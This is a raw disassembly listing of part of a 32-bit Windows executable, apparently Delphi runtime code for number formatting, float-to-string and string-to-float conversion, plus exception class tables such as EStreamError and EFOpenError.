  406fe1:	8b 75 08             	mov    0x8(%ebp),%esi
  406fe4:	8a 06                	mov    (%esi),%al
  406fe6:	0a c0                	or     %al,%al
  406fe8:	74 02                	je     0x406fec
  406fea:	3c 3b                	cmp    $0x3b,%al
  406fec:	c3                   	ret
  406fed:	8a e0                	mov    %al,%ah
  406fef:	ac                   	lods   %ds:(%esi),%al
  406ff0:	3a c4                	cmp    %ah,%al
  406ff2:	74 d0                	je     0x406fc4
  406ff4:	0a c0                	or     %al,%al
  406ff6:	75 f7                	jne    0x406fef
  406ff8:	eb e7                	jmp    0x406fe1
  406ffa:	53                   	push   %ebx
  406ffb:	89 75 f0             	mov    %esi,-0x10(%ebp)
  406ffe:	bb ff 7f 00 00       	mov    $0x7fff,%ebx
  407003:	33 c9                	xor    %ecx,%ecx
  407005:	33 d2                	xor    %edx,%edx
  407007:	c7 45 e8 ff ff ff ff 	movl   $0xffffffff,-0x18(%ebp)
  40700e:	88 55 f8             	mov    %dl,-0x8(%ebp)
  407011:	88 55 f4             	mov    %dl,-0xc(%ebp)
  407014:	ac                   	lods   %ds:(%esi),%al
  407015:	3c 23                	cmp    $0x23,%al
  407017:	74 26                	je     0x40703f
  407019:	3c 30                	cmp    $0x30,%al
  40701b:	74 25                	je     0x407042
  40701d:	3c 2e                	cmp    $0x2e,%al
  40701f:	74 2c                	je     0x40704d
  407021:	3c 2c                	cmp    $0x2c,%al
  407023:	74 33                	je     0x407058
  407025:	3c 27                	cmp    $0x27,%al
  407027:	74 35                	je     0x40705e
  407029:	3c 22                	cmp    $0x22,%al
  40702b:	74 31                	je     0x40705e
  40702d:	3c 45                	cmp    $0x45,%al
  40702f:	74 3a                	je     0x40706b
  407031:	3c 65                	cmp    $0x65,%al
  407033:	74 36                	je     0x40706b
  407035:	3c 3b                	cmp    $0x3b,%al
  407037:	74 46                	je     0x40707f
  407039:	0a c0                	or     %al,%al
  40703b:	75 d7                	jne    0x407014
  40703d:	eb 40                	jmp    0x40707f
  40703f:	42                   	inc    %edx
  407040:	eb d2                	jmp    0x407014
  407042:	3b d3                	cmp    %ebx,%edx
  407044:	7d 02                	jge    0x407048
  407046:	8b da                	mov    %edx,%ebx
  407048:	42                   	inc    %edx
  407049:	8b ca                	mov    %edx,%ecx
  40704b:	eb c7                	jmp    0x407014
  40704d:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  407051:	75 c1                	jne    0x407014
  407053:	89 55 e8             	mov    %edx,-0x18(%ebp)
  407056:	eb bc                	jmp    0x407014
  407058:	c6 45 f8 01          	movb   $0x1,-0x8(%ebp)
  40705c:	eb b6                	jmp    0x407014
  40705e:	8a e0                	mov    %al,%ah
  407060:	ac                   	lods   %ds:(%esi),%al
  407061:	3a c4                	cmp    %ah,%al
  407063:	74 af                	je     0x407014
  407065:	0a c0                	or     %al,%al
  407067:	75 f7                	jne    0x407060
  407069:	eb 14                	jmp    0x40707f
  40706b:	ac                   	lods   %ds:(%esi),%al
  40706c:	3c 2d                	cmp    $0x2d,%al
  40706e:	74 04                	je     0x407074
  407070:	3c 2b                	cmp    $0x2b,%al
  407072:	75 a1                	jne    0x407015
  407074:	c6 45 f4 01          	movb   $0x1,-0xc(%ebp)
  407078:	ac                   	lods   %ds:(%esi),%al
  407079:	3c 30                	cmp    $0x30,%al
  40707b:	74 fb                	je     0x407078
  40707d:	eb 96                	jmp    0x407015
  40707f:	89 55 ec             	mov    %edx,-0x14(%ebp)
  407082:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  407086:	75 03                	jne    0x40708b
  407088:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40708b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40708e:	2b c1                	sub    %ecx,%eax
  407090:	7e 02                	jle    0x407094
  407092:	33 c0                	xor    %eax,%eax
  407094:	89 45 e0             	mov    %eax,-0x20(%ebp)
  407097:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40709a:	2b c3                	sub    %ebx,%eax
  40709c:	7d 02                	jge    0x4070a0
  40709e:	33 c0                	xor    %eax,%eax
  4070a0:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4070a3:	5b                   	pop    %ebx
  4070a4:	c3                   	ret
  4070a5:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  4070a9:	74 07                	je     0x4070b2
  4070ab:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4070ae:	33 d2                	xor    %edx,%edx
  4070b0:	eb 13                	jmp    0x4070c5
  4070b2:	0f bf 45 c0          	movswl -0x40(%ebp),%eax
  4070b6:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  4070b9:	7f 03                	jg     0x4070be
  4070bb:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4070be:	0f bf 55 c0          	movswl -0x40(%ebp),%edx
  4070c2:	2b 55 e8             	sub    -0x18(%ebp),%edx
  4070c5:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4070c8:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4070cb:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4070ce:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4070d1:	8d 5d c3             	lea    -0x3d(%ebp),%ebx
  4070d4:	80 7d c2 00          	cmpb   $0x0,-0x3e(%ebp)
  4070d8:	74 08                	je     0x4070e2
  4070da:	3b 75 08             	cmp    0x8(%ebp),%esi
  4070dd:	75 03                	jne    0x4070e2
  4070df:	b0 2d                	mov    $0x2d,%al
  4070e1:	aa                   	stos   %al,%es:(%edi)
  4070e2:	ac                   	lods   %ds:(%esi),%al
  4070e3:	3c 23                	cmp    $0x23,%al
  4070e5:	74 27                	je     0x40710e
  4070e7:	3c 30                	cmp    $0x30,%al
  4070e9:	74 23                	je     0x40710e
  4070eb:	3c 2e                	cmp    $0x2e,%al
  4070ed:	74 f3                	je     0x4070e2
  4070ef:	3c 2c                	cmp    $0x2c,%al
  4070f1:	74 ef                	je     0x4070e2
  4070f3:	3c 27                	cmp    $0x27,%al
  4070f5:	74 1e                	je     0x407115
  4070f7:	3c 22                	cmp    $0x22,%al
  4070f9:	74 1a                	je     0x407115
  4070fb:	3c 45                	cmp    $0x45,%al
  4070fd:	74 24                	je     0x407123
  4070ff:	3c 65                	cmp    $0x65,%al
  407101:	74 20                	je     0x407123
  407103:	3c 3b                	cmp    $0x3b,%al
  407105:	74 53                	je     0x40715a
  407107:	0a c0                	or     %al,%al
  407109:	74 4f                	je     0x40715a
  40710b:	aa                   	stos   %al,%es:(%edi)
  40710c:	eb d4                	jmp    0x4070e2
  40710e:	e8 4d 00 00 00       	call   0x407160
  407113:	eb cd                	jmp    0x4070e2
  407115:	8a e0                	mov    %al,%ah
  407117:	ac                   	lods   %ds:(%esi),%al
  407118:	3a c4                	cmp    %ah,%al
  40711a:	74 c6                	je     0x4070e2
  40711c:	0a c0                	or     %al,%al
  40711e:	74 3a                	je     0x40715a
  407120:	aa                   	stos   %al,%es:(%edi)
  407121:	eb f4                	jmp    0x407117
  407123:	8a 26                	mov    (%esi),%ah
  407125:	80 fc 2b             	cmp    $0x2b,%ah
  407128:	74 07                	je     0x407131
  40712a:	80 fc 2d             	cmp    $0x2d,%ah
  40712d:	75 dc                	jne    0x40710b
  40712f:	32 e4                	xor    %ah,%ah
  407131:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  407136:	41                   	inc    %ecx
  407137:	46                   	inc    %esi
  407138:	80 3e 30             	cmpb   $0x30,(%esi)
  40713b:	74 f9                	je     0x407136
  40713d:	83 f9 04             	cmp    $0x4,%ecx
  407140:	72 05                	jb     0x407147
  407142:	b9 04 00 00 00       	mov    $0x4,%ecx
  407147:	53                   	push   %ebx
  407148:	8a 5d c3             	mov    -0x3d(%ebp),%bl
  40714b:	0f bf 55 c0          	movswl -0x40(%ebp),%edx
  40714f:	2b 55 e8             	sub    -0x18(%ebp),%edx
  407152:	e8 2a fc ff ff       	call   0x406d81
  407157:	5b                   	pop    %ebx
  407158:	eb 88                	jmp    0x4070e2
  40715a:	8b c7                	mov    %edi,%eax
  40715c:	2b 45 fc             	sub    -0x4(%ebp),%eax
  40715f:	c3                   	ret
  407160:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  407164:	74 1b                	je     0x407181
  407166:	7c 0c                	jl     0x407174
  407168:	e8 14 00 00 00       	call   0x407181
  40716d:	ff 4d d8             	decl   -0x28(%ebp)
  407170:	75 f6                	jne    0x407168
  407172:	eb 0d                	jmp    0x407181
  407174:	ff 45 d8             	incl   -0x28(%ebp)
  407177:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40717a:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  40717d:	7e 12                	jle    0x407191
  40717f:	eb 41                	jmp    0x4071c2
  407181:	8a 03                	mov    (%ebx),%al
  407183:	43                   	inc    %ebx
  407184:	0a c0                	or     %al,%al
  407186:	75 0b                	jne    0x407193
  407188:	4b                   	dec    %ebx
  407189:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40718c:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40718f:	7e 31                	jle    0x4071c2
  407191:	b0 30                	mov    $0x30,%al
  407193:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  407197:	75 0b                	jne    0x4071a4
  407199:	8a e0                	mov    %al,%ah
  40719b:	a0 97 c4 40 00       	mov    0x40c497,%al
  4071a0:	66 ab                	stos   %ax,%es:(%edi)
  4071a2:	eb 1e                	jmp    0x4071c2
  4071a4:	aa                   	stos   %al,%es:(%edi)
  4071a5:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  4071a9:	74 17                	je     0x4071c2
  4071ab:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4071ae:	83 f8 01             	cmp    $0x1,%eax
  4071b1:	7e 0f                	jle    0x4071c2
  4071b3:	b2 03                	mov    $0x3,%dl
  4071b5:	f6 f2                	div    %dl
  4071b7:	80 fc 01             	cmp    $0x1,%ah
  4071ba:	75 06                	jne    0x4071c2
  4071bc:	a0 96 c4 40 00       	mov    0x40c496,%al
  4071c1:	aa                   	stos   %al,%es:(%edi)
  4071c2:	ff 4d dc             	decl   -0x24(%ebp)
  4071c5:	c3                   	ret
  4071c6:	55                   	push   %ebp
  4071c7:	8b ec                	mov    %esp,%ebp
  4071c9:	83 ec 1a             	sub    $0x1a,%esp
  4071cc:	57                   	push   %edi
  4071cd:	56                   	push   %esi
  4071ce:	53                   	push   %ebx
  4071cf:	8b d8                	mov    %eax,%ebx
  4071d1:	8b f2                	mov    %edx,%esi
  4071d3:	80 f9 00             	cmp    $0x0,%cl
  4071d6:	74 07                	je     0x4071df
  4071d8:	e8 05 01 00 00       	call   0x4072e2
  4071dd:	eb 05                	jmp    0x4071e4
  4071df:	e8 09 00 00 00       	call   0x4071ed
  4071e4:	5b                   	pop    %ebx
  4071e5:	5e                   	pop    %esi
  4071e6:	5f                   	pop    %edi
  4071e7:	8b e5                	mov    %ebp,%esp
  4071e9:	5d                   	pop    %ebp
  4071ea:	c2 08 00             	ret    $0x8
  4071ed:	66 8b 46 08          	mov    0x8(%esi),%ax
  4071f1:	8b d0                	mov    %eax,%edx
  4071f3:	25 ff 7f 00 00       	and    $0x7fff,%eax
  4071f8:	74 10                	je     0x40720a
  4071fa:	3d ff 7f 00 00       	cmp    $0x7fff,%eax
  4071ff:	75 14                	jne    0x407215
  407201:	66 81 7e 06 00 80    	cmpw   $0x8000,0x6(%esi)
  407207:	74 03                	je     0x40720c
  407209:	40                   	inc    %eax
  40720a:	33 d2                	xor    %edx,%edx
  40720c:	c6 43 03 00          	movb   $0x0,0x3(%ebx)
  407210:	e9 c2 00 00 00       	jmp    0x4072d7
  407215:	db 2e                	fldt   (%esi)
  407217:	2d ff 3f 00 00       	sub    $0x3fff,%eax
  40721c:	69 c0 10 4d 00 00    	imul   $0x4d10,%eax,%eax
  407222:	c1 f8 10             	sar    $0x10,%eax
  407225:	40                   	inc    %eax
  407226:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407229:	b8 12 00 00 00       	mov    $0x12,%eax
  40722e:	2b 45 f8             	sub    -0x8(%ebp),%eax
  407231:	d9 e1                	fabs
  407233:	e8 ec cf ff ff       	call   0x404224
  407238:	d9 fc                	frndint
  40723a:	db 2d 18 6c 40 00    	fldt   0x406c18
  407240:	d8 d9                	fcomp  %st(1)
  407242:	9b dd 7d fc          	fstsw  -0x4(%ebp)
  407246:	9b                   	fwait
  407247:	66 f7 45 fc 00 41    	testw  $0x4100,-0x4(%ebp)
  40724d:	74 09                	je     0x407258
  40724f:	da 35 08 6c 40 00    	fidivl 0x406c08
  407255:	ff 45 f8             	incl   -0x8(%ebp)
  407258:	df 75 e6             	fbstp  -0x1a(%ebp)
  40725b:	8d 7b 03             	lea    0x3(%ebx),%edi
  40725e:	ba 09 00 00 00       	mov    $0x9,%edx
  407263:	9b                   	fwait
  407264:	8a 44 15 e5          	mov    -0x1b(%ebp,%edx,1),%al
  407268:	8a e0                	mov    %al,%ah
  40726a:	c0 e8 04             	shr    $0x4,%al
  40726d:	80 e4 0f             	and    $0xf,%ah
  407270:	66 05 30 30          	add    $0x3030,%ax
  407274:	66 ab                	stos   %ax,%es:(%edi)
  407276:	4a                   	dec    %edx
  407277:	75 eb                	jne    0x407264
  407279:	32 c0                	xor    %al,%al
  40727b:	aa                   	stos   %al,%es:(%edi)
  40727c:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40727f:	03 7d 08             	add    0x8(%ebp),%edi
  407282:	79 04                	jns    0x407288
  407284:	33 c0                	xor    %eax,%eax
  407286:	eb 82                	jmp    0x40720a
  407288:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  40728b:	72 03                	jb     0x407290
  40728d:	8b 7d 0c             	mov    0xc(%ebp),%edi
  407290:	83 ff 12             	cmp    $0x12,%edi
  407293:	73 27                	jae    0x4072bc
  407295:	80 7c 3b 03 35       	cmpb   $0x35,0x3(%ebx,%edi,1)
  40729a:	72 25                	jb     0x4072c1
  40729c:	c6 44 3b 03 00       	movb   $0x0,0x3(%ebx,%edi,1)
  4072a1:	4f                   	dec    %edi
  4072a2:	78 0d                	js     0x4072b1
  4072a4:	fe 44 3b 03          	incb   0x3(%ebx,%edi,1)
  4072a8:	80 7c 3b 03 39       	cmpb   $0x39,0x3(%ebx,%edi,1)
  4072ad:	77 ed                	ja     0x40729c
  4072af:	eb 1f                	jmp    0x4072d0
  4072b1:	66 c7 43 03 31 00    	movw   $0x31,0x3(%ebx)
  4072b7:	ff 45 f8             	incl   -0x8(%ebp)
  4072ba:	eb 14                	jmp    0x4072d0
  4072bc:	bf 12 00 00 00       	mov    $0x12,%edi
  4072c1:	c6 44 3b 03 00       	movb   $0x0,0x3(%ebx,%edi,1)
  4072c6:	4f                   	dec    %edi
  4072c7:	78 07                	js     0x4072d0
  4072c9:	80 7c 3b 03 30       	cmpb   $0x30,0x3(%ebx,%edi,1)
  4072ce:	74 f1                	je     0x4072c1
  4072d0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4072d3:	66 8b 56 08          	mov    0x8(%esi),%dx
  4072d7:	66 c1 ea 0f          	shr    $0xf,%dx
  4072db:	66 89 03             	mov    %ax,(%ebx)
  4072de:	88 53 02             	mov    %dl,0x2(%ebx)
  4072e1:	c3                   	ret
  4072e2:	8b 06                	mov    (%esi),%eax
  4072e4:	8b 56 04             	mov    0x4(%esi),%edx
  4072e7:	8b c8                	mov    %eax,%ecx
  4072e9:	0b ca                	or     %edx,%ecx
  4072eb:	0f 84 b4 00 00 00    	je     0x4073a5
  4072f1:	0b d2                	or     %edx,%edx
  4072f3:	79 07                	jns    0x4072fc
  4072f5:	f7 da                	neg    %edx
  4072f7:	f7 d8                	neg    %eax
  4072f9:	83 da 00             	sbb    $0x0,%edx
  4072fc:	33 c9                	xor    %ecx,%ecx
  4072fe:	8b 7d 08             	mov    0x8(%ebp),%edi
  407301:	0b ff                	or     %edi,%edi
  407303:	7d 02                	jge    0x407307
  407305:	33 ff                	xor    %edi,%edi
  407307:	83 ff 04             	cmp    $0x4,%edi
  40730a:	7c 1f                	jl     0x40732b
  40730c:	bf 04 00 00 00       	mov    $0x4,%edi
  407311:	41                   	inc    %ecx
  407312:	2d 00 00 64 a7       	sub    $0xa7640000,%eax
  407317:	81 da b3 b6 e0 0d    	sbb    $0xde0b6b3,%edx
  40731d:	73 f2                	jae    0x407311
  40731f:	49                   	dec    %ecx
  407320:	05 00 00 64 a7       	add    $0xa7640000,%eax
  407325:	81 d2 b3 b6 e0 0d    	adc    $0xde0b6b3,%edx
  40732b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40732e:	89 55 f4             	mov    %edx,-0xc(%ebp)
  407331:	df 6d f0             	fildll -0x10(%ebp)
  407334:	8b d7                	mov    %edi,%edx
  407336:	b8 04 00 00 00       	mov    $0x4,%eax
  40733b:	2b c2                	sub    %edx,%eax
  40733d:	74 07                	je     0x407346
  40733f:	da 34 85 04 6c 40 00 	fidivl 0x406c04(,%eax,4)
  407346:	df 75 e6             	fbstp  -0x1a(%ebp)
  407349:	8d 7b 03             	lea    0x3(%ebx),%edi
  40734c:	9b                   	fwait
  40734d:	0b c9                	or     %ecx,%ecx
  40734f:	75 1b                	jne    0x40736c
  407351:	b9 09 00 00 00       	mov    $0x9,%ecx
  407356:	8a 44 0d e5          	mov    -0x1b(%ebp,%ecx,1),%al
  40735a:	8a e0                	mov    %al,%ah
  40735c:	c0 e8 04             	shr    $0x4,%al
  40735f:	75 1e                	jne    0x40737f
  407361:	8a c4                	mov    %ah,%al
  407363:	24 0f                	and    $0xf,%al
  407365:	75 1f                	jne    0x407386
  407367:	49                   	dec    %ecx
  407368:	75 ec                	jne    0x407356
  40736a:	eb 39                	jmp    0x4073a5
  40736c:	8a c1                	mov    %cl,%al
  40736e:	04 30                	add    $0x30,%al
  407370:	aa                   	stos   %al,%es:(%edi)
  407371:	b9 09 00 00 00       	mov    $0x9,%ecx
  407376:	8a 44 0d e5          	mov    -0x1b(%ebp,%ecx,1),%al
  40737a:	8a e0                	mov    %al,%ah
  40737c:	c0 e8 04             	shr    $0x4,%al
  40737f:	04 30                	add    $0x30,%al
  407381:	aa                   	stos   %al,%es:(%edi)
  407382:	8a c4                	mov    %ah,%al
  407384:	24 0f                	and    $0xf,%al
  407386:	04 30                	add    $0x30,%al
  407388:	aa                   	stos   %al,%es:(%edi)
  407389:	49                   	dec    %ecx
  40738a:	75 ea                	jne    0x407376
  40738c:	8b c7                	mov    %edi,%eax
  40738e:	8d 4c 13 03          	lea    0x3(%ebx,%edx,1),%ecx
  407392:	2b c1                	sub    %ecx,%eax
  407394:	c6 07 00             	movb   $0x0,(%edi)
  407397:	4f                   	dec    %edi
  407398:	80 3f 30             	cmpb   $0x30,(%edi)
  40739b:	74 f7                	je     0x407394
  40739d:	8b 56 04             	mov    0x4(%esi),%edx
  4073a0:	c1 ea 1f             	shr    $0x1f,%edx
  4073a3:	eb 07                	jmp    0x4073ac
  4073a5:	33 c0                	xor    %eax,%eax
  4073a7:	33 d2                	xor    %edx,%edx
  4073a9:	88 43 03             	mov    %al,0x3(%ebx)
  4073ac:	66 89 03             	mov    %ax,(%ebx)
  4073af:	88 53 02             	mov    %dl,0x2(%ebx)
  4073b2:	c3                   	ret
  4073b3:	55                   	push   %ebp
  4073b4:	8b ec                	mov    %esp,%ebp
  4073b6:	83 ec 06             	sub    $0x6,%esp
  4073b9:	57                   	push   %edi
  4073ba:	56                   	push   %esi
  4073bb:	53                   	push   %ebx
  4073bc:	8b f0                	mov    %eax,%esi
  4073be:	8b fa                	mov    %edx,%edi
  4073c0:	8b d9                	mov    %ecx,%ebx
  4073c2:	9b d9 7d fa          	fstcw  -0x6(%ebp)
  4073c6:	9b db e2             	fclex
  4073c9:	d9 2d 22 6c 40 00    	fldcw  0x406c22
  4073cf:	d9 ee                	fldz
  4073d1:	e8 88 00 00 00       	call   0x40745e
  4073d6:	8a 3e                	mov    (%esi),%bh
  4073d8:	80 ff 2b             	cmp    $0x2b,%bh
  4073db:	74 05                	je     0x4073e2
  4073dd:	80 ff 2d             	cmp    $0x2d,%bh
  4073e0:	75 01                	jne    0x4073e3
  4073e2:	46                   	inc    %esi
  4073e3:	8b ce                	mov    %esi,%ecx
  4073e5:	e8 7f 00 00 00       	call   0x407469
  4073ea:	33 d2                	xor    %edx,%edx
  4073ec:	8a 06                	mov    (%esi),%al
  4073ee:	3a 05 97 c4 40 00    	cmp    0x40c497,%al
  4073f4:	75 08                	jne    0x4073fe
  4073f6:	46                   	inc    %esi
  4073f7:	e8 6d 00 00 00       	call   0x407469
  4073fc:	f7 da                	neg    %edx
  4073fe:	3b ce                	cmp    %esi,%ecx
  407400:	74 4a                	je     0x40744c
  407402:	8a 06                	mov    (%esi),%al
  407404:	24 df                	and    $0xdf,%al
  407406:	3c 45                	cmp    $0x45,%al
  407408:	75 0a                	jne    0x407414
  40740a:	46                   	inc    %esi
  40740b:	52                   	push   %edx
  40740c:	e8 74 00 00 00       	call   0x407485
  407411:	58                   	pop    %eax
  407412:	03 d0                	add    %eax,%edx
  407414:	e8 45 00 00 00       	call   0x40745e
  407419:	80 3e 00             	cmpb   $0x0,(%esi)
  40741c:	75 2e                	jne    0x40744c
  40741e:	8b c2                	mov    %edx,%eax
  407420:	80 fb 01             	cmp    $0x1,%bl
  407423:	75 03                	jne    0x407428
  407425:	83 c0 04             	add    $0x4,%eax
  407428:	e8 f7 cd ff ff       	call   0x404224
  40742d:	80 ff 2d             	cmp    $0x2d,%bh
  407430:	75 02                	jne    0x407434
  407432:	d9 e0                	fchs
  407434:	80 fb 00             	cmp    $0x0,%bl
  407437:	74 04                	je     0x40743d
  407439:	df 3f                	fistpll (%edi)
  40743b:	eb 02                	jmp    0x40743f
  40743d:	db 3f                	fstpt  (%edi)
  40743f:	9b df e0             	fstsw  %ax
  407442:	66 a9 09 00          	test   $0x9,%ax
  407446:	75 06                	jne    0x40744e
  407448:	b0 01                	mov    $0x1,%al
  40744a:	eb 04                	jmp    0x407450
  40744c:	dd d8                	fstp   %st(0)
  40744e:	33 c0                	xor    %eax,%eax
  407450:	9b db e2             	fclex
  407453:	d9 6d fa             	fldcw  -0x6(%ebp)
  407456:	9b                   	fwait
  407457:	5b                   	pop    %ebx
  407458:	5e                   	pop    %esi
  407459:	5f                   	pop    %edi
  40745a:	8b e5                	mov    %ebp,%esp
  40745c:	5d                   	pop    %ebp
  40745d:	c3                   	ret
  40745e:	ac                   	lods   %ds:(%esi),%al
  40745f:	0a c0                	or     %al,%al
  407461:	74 04                	je     0x407467
  407463:	3c 20                	cmp    $0x20,%al
  407465:	74 f7                	je     0x40745e
  407467:	4e                   	dec    %esi
  407468:	c3                   	ret
  407469:	33 c0                	xor    %eax,%eax
  40746b:	33 d2                	xor    %edx,%edx
  40746d:	ac                   	lods   %ds:(%esi),%al
  40746e:	2c 3a                	sub    $0x3a,%al
  407470:	04 0a                	add    $0xa,%al
  407472:	73 0f                	jae    0x407483
  407474:	da 0d 08 6c 40 00    	fimull 0x406c08
  40747a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40747d:	da 45 fc             	fiaddl -0x4(%ebp)
  407480:	42                   	inc    %edx
  407481:	eb ea                	jmp    0x40746d
  407483:	4e                   	dec    %esi
  407484:	c3                   	ret
  407485:	33 c0                	xor    %eax,%eax
  407487:	33 d2                	xor    %edx,%edx
  407489:	8a 0e                	mov    (%esi),%cl
  40748b:	80 f9 2b             	cmp    $0x2b,%cl
  40748e:	74 05                	je     0x407495
  407490:	80 f9 2d             	cmp    $0x2d,%cl
  407493:	75 01                	jne    0x407496
  407495:	46                   	inc    %esi
  407496:	8a 06                	mov    (%esi),%al
  407498:	2c 3a                	sub    $0x3a,%al
  40749a:	04 0a                	add    $0xa,%al
  40749c:	73 0e                	jae    0x4074ac
  40749e:	46                   	inc    %esi
  40749f:	6b d2 0a             	imul   $0xa,%edx,%edx
  4074a2:	03 d0                	add    %eax,%edx
  4074a4:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
  4074aa:	72 ea                	jb     0x407496
  4074ac:	80 f9 2d             	cmp    $0x2d,%cl
  4074af:	75 02                	jne    0x4074b3
  4074b1:	f7 da                	neg    %edx
  4074b3:	c3                   	ret
  4074b4:	55                   	push   %ebp
  4074b5:	8b ec                	mov    %esp,%ebp
  4074b7:	53                   	push   %ebx
  4074b8:	56                   	push   %esi
  4074b9:	57                   	push   %edi
  4074ba:	33 c0                	xor    %eax,%eax
  4074bc:	55                   	push   %ebp
  4074bd:	68 ea 74 40 00       	push   $0x4074ea
  4074c2:	64 ff 30             	push   %fs:(%eax)
  4074c5:	64 89 20             	mov    %esp,%fs:(%eax)
  4074c8:	e8 c7 f6 ff ff       	call   0x406b94
  4074cd:	e8 9e ed ff ff       	call   0x406270
  4074d2:	e8 dd ee ff ff       	call   0x4063b4
  4074d7:	e8 04 f7 ff ff       	call   0x406be0
  4074dc:	33 c0                	xor    %eax,%eax
  4074de:	5a                   	pop    %edx
  4074df:	59                   	pop    %ecx
  4074e0:	59                   	pop    %ecx
  4074e1:	64 89 10             	mov    %edx,%fs:(%eax)
  4074e4:	68 f1 74 40 00       	push   $0x4074f1
  4074e9:	c3                   	ret
  4074ea:	e9 71 b8 ff ff       	jmp    0x402d60
  4074ef:	eb f8                	jmp    0x4074e9
  4074f1:	5f                   	pop    %edi
  4074f2:	5e                   	pop    %esi
  4074f3:	5b                   	pop    %ebx
  4074f4:	5d                   	pop    %ebp
  4074f5:	c3                   	ret
  4074f6:	8b c0                	mov    %eax,%eax
	...
  407510:	2c 75                	sub    $0x75,%al
  407512:	40                   	inc    %eax
  407513:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407516:	00 00                	add    %al,(%eax)
  407518:	04 47                	add    $0x47,%al
  40751a:	40                   	inc    %eax
  40751b:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40751f:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  407523:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  407527:	00 c0                	add    %al,%al
  407529:	29 40 00             	sub    %eax,0x0(%eax)
  40752c:	0c 45                	or     $0x45,%al
  40752e:	53                   	push   %ebx
  40752f:	74 72                	je     0x4075a3
  407531:	65 61                	gs popa
  407533:	6d                   	insl   (%dx),%es:(%edi)
  407534:	45                   	inc    %ebp
  407535:	72 72                	jb     0x4075a9
  407537:	6f                   	outsl  %ds:(%esi),(%dx)
  407538:	72 8d                	jb     0x4074c7
  40753a:	40                   	inc    %eax
	...
  407553:	00 70 75             	add    %dh,0x75(%eax)
  407556:	40                   	inc    %eax
  407557:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40755a:	00 00                	add    %al,(%eax)
  40755c:	2c 75                	sub    $0x75,%al
  40755e:	40                   	inc    %eax
  40755f:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  407563:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  407567:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  40756b:	00 c0                	add    %al,%al
  40756d:	29 40 00             	sub    %eax,0x0(%eax)
  407570:	0d 45 46 43 72       	or     $0x72434645,%eax
  407575:	65 61                	gs popa
  407577:	74 65                	je     0x4075de
  407579:	45                   	inc    %ebp
  40757a:	72 72                	jb     0x4075ee
  40757c:	6f                   	outsl  %ds:(%esi),(%dx)
  40757d:	72 8b                	jb     0x40750a
  40757f:	c0 00 00             	rolb   $0x0,(%eax)
	...
  407596:	00 00                	add    %al,(%eax)
  407598:	b4 75                	mov    $0x75,%ah
  40759a:	40                   	inc    %eax
  40759b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40759e:	00 00                	add    %al,(%eax)
  4075a0:	2c 75                	sub    $0x75,%al
  4075a2:	40                   	inc    %eax
  4075a3:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4075a7:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4075ab:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4075af:	00 c0                	add    %al,%al
  4075b1:	29 40 00             	sub    %eax,0x0(%eax)
  4075b4:	0b 45 46             	or     0x46(%ebp),%eax
  4075b7:	4f                   	dec    %edi
  4075b8:	70 65                	jo     0x40761f
  4075ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4075bb:	45                   	inc    %ebp
  4075bc:	72 72                	jb     0x407630
  4075be:	6f                   	outsl  %ds:(%esi),(%dx)
  4075bf:	72 00                	jb     0x4075c1
	...
  4075d5:	00 00                	add    %al,(%eax)
  4075d7:	00 f4                	add    %dh,%ah
  4075d9:	75 40                	jne    0x40761b
  4075db:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075de:	00 00                	add    %al,(%eax)
  4075e0:	2c 75                	sub    $0x75,%al
  4075e2:	40                   	inc    %eax
  4075e3:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4075e7:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4075eb:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4075ef:	00 c0                	add    %al,%al
  4075f1:	29 40 00             	sub    %eax,0x0(%eax)
  4075f4:	0b 45 46             	or     0x46(%ebp),%eax
  4075f7:	69 6c 65 72 45 72 72 	imul   $0x6f727245,0x72(%ebp,%eiz,2),%ebp
  4075fe:	6f 
  4075ff:	72 00                	jb     0x407601
	...
  407615:	00 00                	add    %al,(%eax)
  407617:	00 34 76             	add    %dh,(%esi,%esi,2)
  40761a:	40                   	inc    %eax
  40761b:	00 0c 00             	add    %cl,(%eax,%eax,1)
